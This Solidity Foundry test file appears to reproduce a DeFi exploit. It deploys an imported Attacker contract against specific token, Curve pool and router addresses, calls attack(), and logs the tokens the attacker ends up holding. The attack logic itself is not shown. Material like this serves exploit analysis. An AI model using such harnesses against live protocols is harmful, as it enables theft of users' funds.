// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "@solmate/tokens/ERC20.sol";
import "../src/Attacker.sol";

contract CounterTest is Test {
    Attacker attacker;
    address usdc = 0xDDAfbb505ad214D7b80b1f830fcCc89B60fb7A83;
    address wxdai = 0xe91D153E0b41518A2Ce8Dd3D7944Fa863463a97d;
    address husd = 0x243E33aa7f6787154a8E59d3C27a66db3F8818ee;
    address hxdai = 0x090a00A2De0EA83DEf700B5e216f87a5D4F394FE;
    address curve = 0x7f90122BF0700F9E7e1F688fe926940E8839F353;
    address router = 0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506;

    function setUp() public {
        attacker = new Attacker(
            usdc,
            wxdai,
            husd,
            hxdai,
            curve,
            router
        );
        
    }

    function testAttack() public {
        attacker.attack();
        emit log_named_uint(
            "USDC balance",
            ERC20(usdc).balanceOf(address(attacker))
        );
        emit log_named_uint(
            "WXdai balance",
            ERC20(wxdai).balanceOf(address(attacker))
        );
        emit log_named_uint(
            "HUSDC balance",
            ERC20(husd).balanceOf(address(attacker))
        );
        emit log_named_uint(
            "Hxdai balance",
            ERC20(hxdai).balanceOf(address(attacker))
        );
    }
}
